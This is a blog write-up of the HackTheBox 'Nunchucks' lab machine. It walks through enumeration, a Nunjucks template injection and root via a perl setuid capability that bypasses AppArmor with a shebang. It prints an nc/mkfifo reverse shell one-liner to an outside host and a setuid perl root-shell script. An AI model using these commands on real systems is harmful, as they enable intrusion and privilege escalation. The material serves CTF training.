<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox Nunchucks" /><meta property="og:locale" content="en" /><meta name="description" content="Nunchucks is an Easy level box that is using ExpreessJS application template engine, Nunjucks, and later finding out its subdomain. On that subdomain Server Side Template Injection(SSTI) vulnerability is residing. Exploiting the vulnerability with POC and getting shell as user David. David has setuid capability on perl binary, later finding out that this binary has limited permissions from AppArmor and after understanding it we can exploit AppArmor using shebang to get root user." /><meta property="og:description" content="Nunchucks is an Easy level box that is using ExpreessJS application template engine, Nunjucks, and later finding out its subdomain. On that subdomain Server Side Template Injection(SSTI) vulnerability is residing. Exploiting the vulnerability with POC and getting shell as user David. David has setuid capability on perl binary, later finding out that this binary has limited permissions from AppArmor and after understanding it we can exploit AppArmor using shebang to get root user." /><link rel="canonical" href="https://am-root.github.io/posts/HTB-Nunchucks/" /><meta property="og:url" content="https://am-root.github.io/posts/HTB-Nunchucks/" /><meta property="og:site_name" content="amroot" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-09T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox Nunchucks" /><meta name="twitter:site" content="@_amroot" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"mainEntityOfPage":{"@type":"WebPage","@id":"https://am-root.github.io/posts/HTB-Nunchucks/"},"description":"Nunchucks is an Easy level box that is using ExpreessJS application template engine, Nunjucks, and later finding out its subdomain. On that subdomain Server Side Template Injection(SSTI) vulnerability is residing. Exploiting the vulnerability with POC and getting shell as user David. David has setuid capability on perl binary, later finding out that this binary has limited permissions from AppArmor and after understanding it we can exploit AppArmor using shebang to get root user.","url":"https://am-root.github.io/posts/HTB-Nunchucks/","@type":"BlogPosting","headline":"HackTheBox Nunchucks","dateModified":"2021-11-09T06:10:03+00:00","datePublished":"2021-11-09T00:00:00+00:00","@context":"https://schema.org"}</script><title>HackTheBox Nunchucks | amroot</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="amroot"><meta name="application-name" content="amroot"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/hacker.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">amroot</a></div><div class="site-subtitle font-italic">CTF writeups and Infosec blogs</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/am-root" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/_amroot" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['janakskhairmode','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/amroot" aria-label="linkedin" class="order-6" > <i class="fab fa-linkedin"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox Nunchucks</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox Nunchucks</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Janak Khairmode </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Nov 9, 2021, 12:00 AM +0000" >Nov 9, 2021<i class="unloaded">2021-11-09T00:00:00+00:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Nov 9, 2021, 11:40 AM +0530" >Nov 9, 2021<i class="unloaded">2021-11-09T06:10:03+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1258 words">6 min read</span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-proofer-ignore data-src="/image/hackthebox/nunchucks/machineinfocard.png" class="preview-img" alt="monitorsinfocard" width="1000" height="400"><p>Nunchucks is an Easy level box that is using ExpreessJS application template engine, Nunjucks, and later finding out its subdomain. On that subdomain Server Side Template Injection(SSTI) vulnerability is residing. Exploiting the vulnerability with POC and getting shell as user David. David has <code class="language-plaintext highlighter-rouge">setuid</code> capability on perl binary, later finding out that this binary has limited permissions from AppArmor and after understanding it we can exploit AppArmor using shebang to get root user.</p><h1 id="enumeration">Enumeration</h1><h2 id="nmap">Nmap</h2><p><code class="language-plaintext highlighter-rouge">nmap</code> is a is a network scanner. With feeding this an IP you can scan for its open ports and services running on it. This tool is exalted for its positive results in the InfoSec community.</p><p>Starting nmap with full port scanning without detecting services and storing the results into <strong>all</strong> file prepending with flag -oA.</p><ul><li><code class="language-plaintext highlighter-rouge">-p-</code> : Specifies All ports 0-65535<li><code class="language-plaintext highlighter-rouge">-oA</code> : To print output into files with extensions gnmap,xml,nmap, Here A stands for All.<li><code class="language-plaintext highlighter-rouge">--min-rate=</code> : When the –min-rate option is given Nmap will do its best to send packets as fast as or faster than the given rate. And I got the following result,</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>Nmap scan report <span class="k">for </span>10.10.11.122
Host is up <span class="o">(</span>0.35s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>383.21 seconds
</pre></table></code></div></div><p>Now I scan them to identify running services and nmap pre-installed scripts using <code class="language-plaintext highlighter-rouge">-sV</code> and <code class="language-plaintext highlighter-rouge">-sC</code> flags respectively.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>Nmap scan report <span class="k">for </span>10.10.11.122
Host is up <span class="o">(</span>0.35s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 <span class="o">(</span>RSA<span class="o">)</span>
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
443/tcp open  ssl/http nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>nunchucks.htb/organizationName<span class="o">=</span>Nunchucks-Certificates/stateOrProvinceName<span class="o">=</span>Dorset/countryName<span class="o">=</span>UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
|_http-title: Nunchucks - Landing Page
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>35.29 seconds
</pre></table></code></div></div><p>On port 443, hostname is given by nmap output, I will quickly add it to my host file.</p><blockquote><p>10.10.11.122 nunchucks.htb nunchucks</p></blockquote><h1 id="escalating-to-david-user">Escalating to David user</h1><p>Visiting <code class="language-plaintext highlighter-rouge">10.10.11.122</code> or <code class="language-plaintext highlighter-rouge">nunchucks.htb:80</code> redirects to <code class="language-plaintext highlighter-rouge">https</code>.</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/01.png" alt="01" style="zoom:67%;" /></p><p>There is a team listed at the bottom of the page, I made small list from them.</p><blockquote><p>mike page <br /> samnatha bloom <br /> nicolas ritcher <br /> mary longhorn <br /> susanne blake <br /> vanya dropper</p></blockquote><p>There are <code class="language-plaintext highlighter-rouge">login</code> and <code class="language-plaintext highlighter-rouge">signup</code> pages also but both of them are throwing errors..</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/02.png" alt="02" style="zoom: 67%;" /></p><h2 id="discovering-storenunchuckshtb">Discovering store.nunchucks.htb</h2><p>In the background, I was running <code class="language-plaintext highlighter-rouge">ffuf</code> to find any Vhosts and it found <code class="language-plaintext highlighter-rouge">store.nunchucks.htb</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ffuf <span class="nt">-u</span> https://nunchucks.htb/ <span class="nt">-w</span> /opt/Tools/SecLists/Discovery/Web-Content/raft-small-words.txt <span class="nt">-H</span> <span class="s2">"Host: FUZZ.nunchucks.htb"</span> <span class="nt">-fl</span> 547
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">-u</code> : Provide URL to scan<li><code class="language-plaintext highlighter-rouge">-w</code> : Wordlist<li><code class="language-plaintext highlighter-rouge">-H</code> : Header, Here Header <code class="language-plaintext highlighter-rouge">Host</code> is used to scan for Vhosts.<li><code class="language-plaintext highlighter-rouge">-fl</code> : To filter lines in repsonse.</ul><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/03.png" alt="03" /></p><p>Adding it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p><blockquote><p>10.10.11.122 nunchucks.htb nunchucks store.nunchucks.htb</p></blockquote><p>At the bottom of <code class="language-plaintext highlighter-rouge">https://nunchucks.htb</code> page was <code class="language-plaintext highlighter-rouge">Store: Coming soon</code> was written. It was hint for Vhost as well.</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/04.png" alt="04" /></p><h2 id="discovering-ssti-on-storenunchuckshtb">Discovering SSTI on store.nunchucks.htb</h2><p>Now visting <code class="language-plaintext highlighter-rouge">store.nunchucks.htb</code>,</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/05.png" alt="05" style="zoom:67%;" /></p><p>I entered my email address in textbox and captured the request,</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/06.png" alt="06" /></p><p>After looking at the request and response, both are in JSON format and my input was reflected on response.</p><p>Also noted that server is ExpressJS. Express.js, or simply Express, is a back end web application framework for Node.js.</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/07.png" style="zoom:80%;" /></p><p>I tried XSS, SQL non of them gave me fruitful results. After keep looking for any perculiar behaviour I found that my input was rendered by back end engine.</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/08.png" alt="08" style="zoom:80%;" /></p><p>Googling for ExpressJS template engines lead me to <a href="https://expressjs.com/en/resources/template-engines.html">a list of template engines</a> used. Name of the box and this template engine sounds similar hence clearly shows that this is inteded vulnerability.</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/09.png" alt="09" style="zoom:80%;" /></p><p>I googled for <code class="language-plaintext highlighter-rouge">Nunjucks template injection</code> and it lead me to <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine">a blog site that showed POC</a> on how to exploit data.</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/10-01.png" alt="10-01" /></p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/10.png" alt="10" /></p><p>I changed <code class="language-plaintext highlighter-rouge">tail</code> to <code class="language-plaintext highlighter-rouge">cat</code> and I got more data than previous response, I was able to extract whole <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file. After looking at the <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, user is David. So I tried extracting ssh key residing in home directory of david, but it is asking for password.</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/11.png" alt="11" /></p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/12.png" alt="12" style="zoom:80%;" /></p><p>Now I used nc reverse shell from <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a> and I got shell as user.</p><blockquote><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.14.25 9001 <span class="o">&gt;</span>/tmp/f
</pre></table></code></div></div></blockquote><p>While getting proper shell, this box is really sensitive I lost my reverse shell trying to put SSH key inside <code class="language-plaintext highlighter-rouge">authorized_keys</code>. Anyway I did that from burp suite.</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/13.png" alt="13" /></p><p>I got proper SSH shell.</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/14.png" alt="14" style="zoom: 67%;" /></p><h1 id="getting-root">Getting root</h1><h2 id="setuid-capability">setuid capability</h2><p>User David has one interesting capability, he can run perl commands with setuid capability.</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/15.png" alt="15" /></p><p>I head over to GTFObins and copied their <a href="https://gtfobins.github.io/gtfobins/perl/#capabilities">capability payload</a> but I did not get shell as root.</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/16.png" alt="16" /></p><p>After looking for more information, I came across some interesting files in <code class="language-plaintext highlighter-rouge">/opt</code> directory.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>david@nunchucks:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 16
drwxr-xr-x  3 root root 4096 Oct 28 17:03 <span class="nb">.</span>
drwxr-xr-x 19 root root 4096 Oct 28 17:03 ..
<span class="nt">-rwxr-xr-x</span>  1 root root  838 Sep  1 12:53 backup.pl
drwxr-xr-x  2 root root 4096 Nov  8 11:41 web_backups
</pre></table></code></div></div><p>looking at the <code class="language-plaintext highlighter-rouge">backup.pl</code> file,</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="c">#!/usr/bin/perl</span>
use strict<span class="p">;</span>
use POSIX qw<span class="o">(</span>strftime<span class="o">)</span><span class="p">;</span>
use DBI<span class="p">;</span>
use POSIX qw<span class="o">(</span>setuid<span class="o">)</span><span class="p">;</span> 
POSIX::setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span> 

my <span class="nv">$tmpdir</span>        <span class="o">=</span> <span class="s2">"/tmp"</span><span class="p">;</span>
my <span class="nv">$backup_main</span> <span class="o">=</span> <span class="s1">'/var/www'</span><span class="p">;</span>
my <span class="nv">$now</span> <span class="o">=</span> strftime<span class="o">(</span><span class="s2">"%Y-%m-%d-%s"</span>, localtime<span class="o">)</span><span class="p">;</span>
my <span class="nv">$tmpbdir</span> <span class="o">=</span> <span class="s2">"</span><span class="nv">$tmpdir</span><span class="s2">/backup_</span><span class="nv">$now</span><span class="s2">"</span><span class="p">;</span>

sub printlog
<span class="o">{</span>
    print <span class="s2">"["</span>, strftime<span class="o">(</span><span class="s2">"%D %T"</span>, localtime<span class="o">)</span>, <span class="s2">"] </span><span class="nv">$_</span><span class="s2">[0]</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="o">}</span>

sub archive
<span class="o">{</span>
    printlog <span class="s2">"Archiving..."</span><span class="p">;</span>
    system<span class="o">(</span><span class="s2">"/usr/bin/tar -zcf </span><span class="nv">$tmpbdir</span><span class="s2">/backup_</span><span class="nv">$now</span><span class="s2">.tar </span><span class="nv">$backup_main</span><span class="s2">/* 2&gt;/dev/null"</span><span class="o">)</span><span class="p">;</span>
    printlog <span class="s2">"Backup complete in </span><span class="nv">$tmpbdir</span><span class="s2">/backup_</span><span class="nv">$now</span><span class="s2">.tar"</span><span class="p">;</span>
<span class="o">}</span>

<span class="k">if</span> <span class="o">(</span><span class="nv">$&gt;</span> <span class="o">!=</span> 0<span class="o">)</span> <span class="o">{</span>
    die <span class="s2">"You must run this script as root.</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="o">}</span>

printlog <span class="s2">"Backup starts."</span><span class="p">;</span>
<span class="nb">mkdir</span><span class="o">(</span><span class="nv">$tmpbdir</span><span class="o">)</span><span class="p">;</span>
&amp;archive<span class="p">;</span>
printlog <span class="s2">"Moving </span><span class="nv">$tmpbdir</span><span class="s2">/backup_</span><span class="nv">$now</span><span class="s2"> to /opt/web_backups"</span><span class="p">;</span>
system<span class="o">(</span><span class="s2">"/usr/bin/mv </span><span class="nv">$tmpbdir</span><span class="s2">/backup_</span><span class="nv">$now</span><span class="s2">.tar /opt/web_backups/"</span><span class="o">)</span><span class="p">;</span>
printlog <span class="s2">"Removing temporary directory"</span><span class="p">;</span>
<span class="nb">rmdir</span><span class="o">(</span><span class="nv">$tmpbdir</span><span class="o">)</span><span class="p">;</span>
printlog <span class="s2">"Completed"</span><span class="p">;</span>
</pre></table></code></div></div><p>This file on execution zipping files from web directory to <code class="language-plaintext highlighter-rouge">/opt/web_backups</code> also it is using POSIX to setuid(0) i.e. setting it to root.</p><h2 id="apparmor">AppArmor</h2><p>It is using AppArmor for execution. AppArmor limits resources for programs and its profiles allows user capability. Looking at the profile in <code class="language-plaintext highlighter-rouge">/etc/apparmor.d</code>,</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>david@nunchucks:/etc/apparmor.d<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nt">--</span> snip <span class="nt">--</span>
<span class="nt">-rw-r--r--</span>   1 root root   442 Sep 26 01:16 usr.bin.perl
<span class="nt">--</span> snip <span class="nt">--</span>
</pre></table></code></div></div><p>Reading file showed that perl is denied <code class="language-plaintext highlighter-rouge">rwx</code> access on /root, while it can run later commands such as <code class="language-plaintext highlighter-rouge">id</code> , <code class="language-plaintext highlighter-rouge">ls</code>, <code class="language-plaintext highlighter-rouge">cat</code>, <code class="language-plaintext highlighter-rouge">whoami</code> and file in <code class="language-plaintext highlighter-rouge">/opt/backup.pl</code> directory.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="c"># Last Modified: Tue Aug 31 18:25:30 2021</span>
<span class="c">#include &lt;tunables/global&gt;</span>

/usr/bin/perl <span class="o">{</span>
  <span class="c">#include &lt;abstractions/base&gt;</span>
  <span class="c">#include &lt;abstractions/nameservice&gt;</span>
  <span class="c">#include &lt;abstractions/perl&gt;</span>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/<span class="k">*</span> rwx,
  deny /etc/shadow rwx,

  /usr/bin/id mrix,
  /usr/bin/ls mrix,
  /usr/bin/cat mrix,
  /usr/bin/whoami mrix,
  /opt/backup.pl mrix,
  owner /home/ r,
  owner /home/david/ r,

<span class="o">}</span>
</pre></table></code></div></div><p>Let’s try those commands,</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/17.png" alt="17" /></p><p><a href="https://bugs.launchpad.net/apparmor/+bug/1911431">Bug from launchpad</a> shows that adding <a href="https://en.wikipedia.org/wiki/Shebang_(Unix)#:~:text=In%20computing%2C%20a%20shebang%20is,bang%2C%20or%20hash%2Dpling.">Shebang(#)</a> will bypass security checks and execute arbitrary script.</p><p>I created small script mentioned before from GTFObins, and added shebang</p><blockquote><p>#!/usr/bin/perl <br /> use POSIX qw(setuid); <br /> POSIX::setuid(0); <br /> exec “/bin/sh”;</p></blockquote><p>gave the script <code class="language-plaintext highlighter-rouge">+x</code> permission</p><blockquote><p>chmod +x shell.pl</p></blockquote><p>and <em>voilà</em> I got root.</p><p><img data-proofer-ignore data-src="/image/hackthebox/nunchucks/18.png" alt="18" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/nmap/" class="post-tag no-text-decoration" >nmap</a> <a href="/tags/https/" class="post-tag no-text-decoration" >https</a> <a href="/tags/443/" class="post-tag no-text-decoration" >443</a> <a href="/tags/ssti/" class="post-tag no-text-decoration" >ssti</a> <a href="/tags/cap-setuid/" class="post-tag no-text-decoration" >cap_setuid</a> <a href="/tags/setuid/" class="post-tag no-text-decoration" >setuid</a> <a href="/tags/capability/" class="post-tag no-text-decoration" >capability</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/javascript/" 